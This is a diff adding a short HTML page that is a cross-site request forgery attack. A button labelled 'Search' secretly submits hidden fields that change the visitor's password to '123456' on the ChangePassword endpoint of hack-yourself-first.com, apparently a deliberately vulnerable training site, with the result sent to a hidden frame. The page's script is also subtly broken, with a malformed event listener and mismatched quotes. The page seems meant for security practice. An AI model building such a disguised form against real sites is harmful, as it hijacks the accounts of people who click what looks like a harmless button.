@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset='utf-8'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <title>Page Title</title>
+    <meta name='viewport' content='width=device-width, initial-scale=1'>
+    <link rel='stylesheet' type='text/css' media='screen' href='main.css'>
+    <script src='main.js'></script>
+</head>
+
+<body>
+    <form name="myform" action="https://hack-yourself-first.com/Account/ChangePassword/=123456&ConfirmPassword=123456" method="post" target="hiddenFrame">
+        <label for="query">Search:</label>
+        <input type="hidden" name="NewPassword" value="123456"/>
+        <input type="hidden" name="ConfirmPassword" value="123456"/>
+        <button>Search</button>
+      </form>
+      
+      <script>
+      var button = document.querySelector('form[name="myform"] > button');
+      button.addEventListener(function() {
+        document.querySelector("form[name="myform"]").submit();
+      });
+      </script>    
+</body>
+</html>>
